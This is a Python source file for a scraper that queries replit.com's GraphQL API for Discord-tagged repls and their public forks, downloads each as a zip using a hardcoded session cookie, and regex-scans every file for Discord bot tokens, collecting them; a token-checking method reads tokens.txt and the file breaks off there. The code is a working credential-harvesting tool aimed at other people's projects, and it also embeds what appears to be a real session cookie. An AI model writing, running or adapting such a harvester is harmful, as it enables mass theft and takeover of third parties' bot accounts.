import aiohttp
import asyncio
from aioconsole import aprint
import websockets
import zipfile
import re
import os
import shutil
import ujson
import uvloop
from .request import RequestMaker
from colorama import Fore as color
import aiofiles

if os.name != "nt":
    import uvloop
    uvloop.install()

class ReplIt:
    def __init__(self) -> None:
        self.GRAPHQL_HEADERS = {
            "Host": "replit.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Origin": "https://replit.com",
            "Connection": "keep-alive",
            "x-requested-with": "XMLHttpRequest"
        }


        self.GRAPHQL = "https://replit.com/graphql"

    #
    async def get_id(self, repl_url: str) -> str:
        """ Gets a replit.com ID from a valid replit.com URL

        Args:
            repl_url (str): Requires a clean replit.com url with no query parameters. E.g https://replit.com/@someone/repo

        Returns:
            str: The repl.it ID
        """

        json = [
            {
                "operationName":"ReplView",
                "variables":{
                    "url":f"{repl_url}"
                },
                "query":"query ReplView($url: String!) {\n  repl(url: $url) {\n    ... on Repl {\n      id\n      imageUrl\n      ...ReplViewRepl\n      __typename\n    }\n    __typename\n  }\n  currentUser {\n    id\n    ...ReplViewCurrentUser\n    __typename\n  }\n}\n\nfragment ReplViewRepl on Repl {\n  id\n  title\n  timeCreated\n  imageUrl\n  publicReleasesForkCount\n  publicForkCount\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  relatedRepls(limitPerGroup: 3) {\n    name\n    repls {\n      id\n      publishedAs\n      ...ReplLinkRepl\n      ...TemplateReplCardRepl\n      ...ReplPostReplCardRepl\n      __typename\n    }\n    __typename\n  }\n  lang {\n    id\n    displayName\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    publish\n    changeIconUrl\n    __typename\n  }\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplTitleRepl\n  ...ReplViewReplViewerRepl\n  ...ReplLinkRepl\n  ...ReplViewFooterRepl\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment TemplateReplCardRepl on Repl {\n  id\n  iconUrl\n  templateCategory\n  title\n  description(plainText: true)\n  publicReleasesForkCount\n  templateLabel\n  likeCount\n  url\n  owner {\n    ... on User {\n      id\n      ...TemplateReplCardFooterUser\n      __typename\n    }\n    ... on Team {\n      id\n      ...TemplateReplCardFooterTeam\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment TemplateReplCardFooterUser on User {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment TemplateReplCardFooterTeam on Team {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplViewReplTitleRepl on Repl {\n  id\n  title\n  iconUrl\n  templateInfo {\n    iconUrl\n    __typename\n  }\n  owner {\n    ... on User {\n      id\n      username\n      __typename\n    }\n    ... on Team {\n      id\n      username\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplActionsPermissions\n  __typename\n}\n\nfragment ReplViewReplActionsPermissions on Repl {\n  id\n  lastPublishedAt\n  publishedAs\n  templateReview {\n    id\n    promoted\n    __typename\n  }\n  currentUserPermissions {\n    publish\n    __typename\n  }\n  ...UnpublishReplRepl\n  __typename\n}\n\nfragment UnpublishReplRepl on Repl {\n  id\n  commentCount\n  likeCount\n  runCount\n  publishedAs\n  __typename\n}\n\nfragment ReplViewReplViewerRepl on Repl {\n  id\n  publishedAs\n  runCount\n  publicForkCount\n  publicReleasesForkCount\n  prodUrl: hostedUrl(dotty: true)\n  isProject\n  nextPagePathname\n  lang {\n    id\n    header\n    displayName\n    __typename\n  }\n  ...ReplViewerOutputOverlayRepl\n  ...UseReplViewerRepl\n  ...LikeButtonRepl\n  __typename\n}\n\nfragment ReplViewerOutputOverlayRepl on Repl {\n  id\n  title\n  imageUrl\n  lastPublishedAt\n  currentUserPermissions {\n    changeImageUrl\n    __typename\n  }\n  __typename\n}\n\nfragment UseReplViewerRepl on Repl {\n  id\n  previewUrl: hostedUrl(dotty: false, dev: false)\n  url\n  wasPosted\n  wasPublished\n  publishedAs\n  isProject\n  lang {\n    id\n    canUseShellRunner\n    hasReplboxWebview\n    __typename\n  }\n  config {\n    isServer\n    isVnc\n    __typename\n  }\n  deployment {\n    id\n    activeRelease {\n      id\n      previewUrl: hostedUrl\n      __typename\n    }\n    __typename\n  }\n  replViewSettings {\n    id\n    defaultView\n    replFile\n    __typename\n  }\n  ...CrosisContextRepl\n  __typename\n}\n\nfragment CrosisContextRepl on Repl {\n  id\n  language\n  slug\n  user {\n    id\n    username\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    __typename\n  }\n  flagOwnerDotReplitPackager: gateOnOwner(feature: \"flag-dotreplit-packager\")\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplViewFooterRepl on Repl {\n  id\n  description\n  lastPublishedAt\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    __typename\n  }\n  source {\n    release {\n      id\n      __typename\n    }\n    deployment {\n      id\n      repl {\n        id\n        ...ReplViewSourceRepl\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  tags {\n    id\n    __typename\n  }\n  origin {\n    id\n    ...ReplViewSourceRepl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewSourceRepl on Repl {\n  id\n  iconUrl\n  title\n  templateLabel\n  ...ReplLinkRepl\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  isModerator: hasRole(role: MODERATOR)\n  isAdmin: hasRole(role: ADMIN)\n  ...ReplViewReplViewerCurrentUser\n  __typename\n}\n\nfragment ReplViewReplViewerCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  ...CrosisContextCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment CrosisContextCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  flagTrackOtClientDataLoss: gate(feature: \"flag-ot-data-loss-client-tracking\")\n  flagPid1Ping: gate(feature: \"flag-pid1-ping-sample\")\n  flagNoPongReconnect: gate(feature: \"flag-no-pong-reconnect\")\n  __typename\n}\n"
            }
        ]

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
            async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=json) as resp:
                if resp.status == 200:
                    j = await resp.json()
                    return j[0]['data']['repl']['id']
                else:
                    j = await resp.text()
                    await aprint(f"{color.RED}{j}{color.RESET}")

    async def get_forks(self, repl_id: str) -> tuple:
        """ Gets repl.it forks regarding a repl

        Args:
            repl_id (str): "A valid replit.com ID"

        Returns:
            tuple: The list of urls and ids

        """
        json = [
            {
                "operationName":"ReplViewForks",
                "variables":{
                    "replId":f"{repl_id}",
                    "count":100
                },
                "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
            }
        ]

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
            async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=json) as resp:
                if resp.status == 200:
                    j = await resp.json()
                    forks = j[0]['data']['repl']['publicForks']['items']
                    urls = [fork['url'] for fork in forks]
                    ids = [fork['id'] for fork in forks]
                    count = j[0]['data']['repl']['publicForkCount']

                    if len(urls) !=  int(count):
                        while True:
                            json2 = [
                                {
                                "operationName":"ReplViewForks",
                                    "variables":{
                                        "replId":f"{repl_id}",
                                        "count":100,
                                        "after":f"{ids[-1]}"
                                    },
                                "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
                                }
                            ]
                            async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=json2) as resp:
                                if resp.status == 200:
                                    j = await resp.json()
                                    forks = j[0]['data']['repl']['publicForks']['items']
                                    if len([fork['url'] for fork in forks]) > 0:
                                        urls += [fork['url'] for fork in forks]
                                        ids += [fork['id'] for fork in forks]

                                    else:
                                        break
                                    if len(urls) >= int(count):
                                        break
                                    else:
                                        continue
                                else:
                                    j = await resp.text()
                                    await aprint(f"{color.RED}{j}{color.RESET}")

                    return urls, ids





                else:
                    j = await resp.text()
                    await aprint(f"{color.RED}{j}{color.RESET}")


    async def get_zip(self, repl_url: str, repl_id: str):
        headers = {
            "Accept": "text/html,application/xhtml+xml",
            "sec-ch-ua": '"Chromium";v="102", "Not A;Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Linux",
            "Service-Worker-Navigation-Preload": "true",
            "Upgrade-Insecure-Requests": "1",
            "Cookie": "_anon_id=abf0f575-1c1c-4de7-bc67-7803533ea9b5; amplitudeSessionId=1658875018; connect.sid=s%3AMX1T-6foGoJBZ-vD4mai6zi3B5PP-__N.%2BikcOEv6Hxvjef1mdu3cBMV0SHttLuzNwL0Tf6rEDi8; replit:authed=1; replit_authed=1; replit_ng=1658875358.96.42.510323|8035451343a2d8f3e54599c71b2aec19; _dd_s=logs=1&id=71c9808c-aa51-4dbf-8dc1-ba183419d5a9&created=1658875018897&expire=1658876264927",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 Safari/537.36"
        }
        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:

            async with session.get(f"https://replit.com{repl_url}.zip") as resp:
                if resp.status == 200:
                    j = await resp.read()
                    async with aiofiles.open(f'./resources/data/{repl_id}.zip', 'wb') as f:
                        await f.write(j)
                        await aprint(f"{color.GREEN}Finished downloading zip{color.RESET}")
                else:
                    j = await resp.text()
                    await aprint(f"{color.RED}{resp.status}{color.RESET}")

    async def search_zip(self, repl_id: str):
        tokens = []
        folder = "./resources/data/extracter"
        with zipfile.ZipFile(f'./resources/data/{repl_id}.zip', 'r') as zip_ref:
            zip_ref.extractall(folder)
        for root, dirs, files in os.walk(folder):
            for file in files:
                file_txt = open(f"{root}/{file}", "r", encoding="utf-8")
                try:
                    file_contents = file_txt.read().strip()

                    disc_tokens = re.findall(r"[A-z|0-9]{24}\.[A-z|0-9|\W]{6}\.[A-z|0-9|\W]{27}", file_contents)
                    if len(disc_tokens) > 0:
                        tokens += disc_tokens
                    file_txt.close()
                except:
                    continue
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                await aprint(f'{color.RED}Failed to delete %s. Reason: %s{color.RESET}' % (file_path, e))

        return tokens

    async def clean_dirs(self):
        folder = "./resources/data"
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                await aprint(f'{color.RED}Failed to delete %s. Reason: %s{color.RESET}' % (file_path, e))

    async def repl_scrape(self):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
            new_json = [
                {
                    "operationName":"ReplPostsFeed",
                    "variables":{
                        "options":{
                            "tags":["discord"],
                            "order":"New"
                        }
                    },
                    "query":"query ReplPostsFeed($options: ReplPostsQueryOptions) {\n  currentUser {\n    id\n    ...ReplPostCurrentUser\n    __typename\n  }\n  replPosts(options: $options) {\n    pageInfo {\n      nextCursor\n      __typename\n    }\n    items {\n      id\n      ...ReplPostPost\n      ...ReplCardPostPost\n      ...OldPostPost\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment ReplPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  replComment {\n    id\n    body(removeMarkdown: true)\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRepl on Repl {\n  id\n  ...ReplPostReplInfoRepl\n  ...LikeButtonRepl\n  ...ReplStatsRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplPostUserPostUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment UserLinkUser on User {\n  id\n  url\n  username\n  __typename\n}\n\nfragment ReplPostReplComment on ReplComment {\n  id\n  body\n  timeCreated\n  user {\n    id\n    ...ReplPostRecentCommentUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRecentCommentUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment ReplCardPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  repl {\n    id\n    ...ReplCardPostRepl\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplCardPostRepl on Repl {\n  id\n  ...LikeButtonRepl\n  ...ReplPostReplCardRepl\n  recentComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment OldPostPost on Post {\n  id\n  title\n  preview(removeMarkdown: true, length: 150)\n  url\n  commentCount\n  isPinned\n  isAnnouncement\n  timeCreated\n  ...PostVoteControlPost\n  ...PostLinkPost\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  board {\n    id\n    name\n    color\n    __typename\n  }\n  recentComments(count: 3) {\n    id\n    preview(removeMarkdown: true, length: 500)\n    timeCreated\n    user {\n      id\n      ...ReplPostRecentCommentUser\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PostVoteControlPost on Post {\n  id\n  voteCount\n  canVote\n  hasVoted\n  __typename\n}\n\nfragment PostLinkPost on Post {\n  id\n  url\n  __typename\n}\n"
                }
            ]
            hot_json = [
                {
                    "operationName":"ReplPostsFeed",
                    "variables":{
                        "options":{
                            "tags":["discord"],
                            "order":"Hot"
                        }
                    },
                    "query":"query ReplPostsFeed($options: ReplPostsQueryOptions) {\n  currentUser {\n    id\n    ...ReplPostCurrentUser\n    __typename\n  }\n  replPosts(options: $options) {\n    pageInfo {\n      nextCursor\n      __typename\n    }\n    items {\n      id\n      ...ReplPostPost\n      ...ReplCardPostPost\n      ...OldPostPost\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment ReplPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  replComment {\n    id\n    body(removeMarkdown: true)\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRepl on Repl {\n  id\n  ...ReplPostReplInfoRepl\n  ...LikeButtonRepl\n  ...ReplStatsRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplPostUserPostUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment UserLinkUser on User {\n  id\n  url\n  username\n  __typename\n}\n\nfragment ReplPostReplComment on ReplComment {\n  id\n  body\n  timeCreated\n  user {\n    id\n    ...ReplPostRecentCommentUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRecentCommentUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment ReplCardPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  repl {\n    id\n    ...ReplCardPostRepl\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplCardPostRepl on Repl {\n  id\n  ...LikeButtonRepl\n  ...ReplPostReplCardRepl\n  recentComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment OldPostPost on Post {\n  id\n  title\n  preview(removeMarkdown: true, length: 150)\n  url\n  commentCount\n  isPinned\n  isAnnouncement\n  timeCreated\n  ...PostVoteControlPost\n  ...PostLinkPost\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  board {\n    id\n    name\n    color\n    __typename\n  }\n  recentComments(count: 3) {\n    id\n    preview(removeMarkdown: true, length: 500)\n    timeCreated\n    user {\n      id\n      ...ReplPostRecentCommentUser\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PostVoteControlPost on Post {\n  id\n  voteCount\n  canVote\n  hasVoted\n  __typename\n}\n\nfragment PostLinkPost on Post {\n  id\n  url\n  __typename\n}\n"
                }
            ]
            top_json = [
                {
                    "operationName":"ReplPostsFeed",
                    "variables":{
                        "options":{
                            "tags":["discord"],
                            "order":"Top"
                        }
                    },
                    "query":"query ReplPostsFeed($options: ReplPostsQueryOptions) {\n  currentUser {\n    id\n    ...ReplPostCurrentUser\n    __typename\n  }\n  replPosts(options: $options) {\n    pageInfo {\n      nextCursor\n      __typename\n    }\n    items {\n      id\n      ...ReplPostPost\n      ...ReplCardPostPost\n      ...OldPostPost\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment ReplPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  replComment {\n    id\n    body(removeMarkdown: true)\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRepl on Repl {\n  id\n  ...ReplPostReplInfoRepl\n  ...LikeButtonRepl\n  ...ReplStatsRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplPostUserPostUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment UserLinkUser on User {\n  id\n  url\n  username\n  __typename\n}\n\nfragment ReplPostReplComment on ReplComment {\n  id\n  body\n  timeCreated\n  user {\n    id\n    ...ReplPostRecentCommentUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRecentCommentUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment ReplCardPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  repl {\n    id\n    ...ReplCardPostRepl\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplCardPostRepl on Repl {\n  id\n  ...LikeButtonRepl\n  ...ReplPostReplCardRepl\n  recentComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment OldPostPost on Post {\n  id\n  title\n  preview(removeMarkdown: true, length: 150)\n  url\n  commentCount\n  isPinned\n  isAnnouncement\n  timeCreated\n  ...PostVoteControlPost\n  ...PostLinkPost\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  board {\n    id\n    name\n    color\n    __typename\n  }\n  recentComments(count: 3) {\n    id\n    preview(removeMarkdown: true, length: 500)\n    timeCreated\n    user {\n      id\n      ...ReplPostRecentCommentUser\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PostVoteControlPost on Post {\n  id\n  voteCount\n  canVote\n  hasVoted\n  __typename\n}\n\nfragment PostLinkPost on Post {\n  id\n  url\n  __typename\n}\n"
                }
            ]
            async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=new_json) as resp:
                if resp.status == 200:
                    j = await resp.json()
                    repls = j[0]['data']['replPosts']['items']

                    ids = [repl['repl']['id'] for repl in repls]
                    urls = [repl['repl']['url'] for repl in repls]
                    async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=hot_json) as resp:
                        if resp.status == 200:
                            j = await resp.json()
                            repls = j[0]['data']['replPosts']['items']
                            ids += [repl['repl']['id'] for repl in repls]
                            urls += [repl['repl']['url'] for repl in repls]
                            async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=top_json) as resp:
                                if resp.status == 200:
                                    j = await resp.json()
                                    repls = j[0]['data']['replPosts']['items']
                                    ids += [repl['repl']['id'] for repl in repls]
                                    urls += [repl['repl']['url'] for repl in repls]

                                else:
                                    await aprint(f"{color.RED}{resp.status}{color.RESET}")
                        else:
                            await aprint(f"{color.RED}{resp.status}{color.RESET}")

                else:
                    await aprint(f"{color.RED}{resp.status}{color.RESET}")
        return urls, ids





    async def check(self):
        tokens = open('tokens.txt', 'r').read().splitlines()

